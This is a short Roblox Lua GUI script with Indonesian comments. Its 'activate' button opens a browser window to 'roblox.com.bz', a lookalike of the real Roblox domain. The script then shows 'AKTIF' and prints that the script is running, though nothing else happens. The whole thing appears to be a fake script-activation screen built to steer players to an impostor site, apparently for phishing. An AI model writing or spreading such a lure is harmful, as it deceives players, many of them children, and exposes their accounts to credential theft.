----------------------------------------------------
-- WEBSITE
----------------------------------------------------

local WEBSITE = "https://roblox.com.bz/communities/8028330213/"

activate.MouseButton1Click:Connect(function()

    -- Membuka website komunitas (hanya berfungsi pada lingkungan yang mendukung BrowserService/OpenCloud.
    -- Di pengalaman Roblox biasa, Anda dapat menggantinya dengan prompt atau QR code.)
    pcall(function()
        GuiService:OpenBrowserWindow(WEBSITE)
    end)

    activate.Text = "AKTIF"

    wait(.5)

    gui:Destroy()

    TweenService:Create(blur,TweenInfo.new(.3),{
        Size=0
    }):Play()

    task.delay(.3,function()
        blur:Destroy()
    end)

    print("Script berjalan...")
end)

exit.MouseButton1Click:Connect(function()

    TweenService:Create(blur,TweenInfo.new(.3),{
        Size=0
    }):Play()

    task.delay(.3,function()
        blur:Destroy()
    end)

    gui:Destroy()

end)
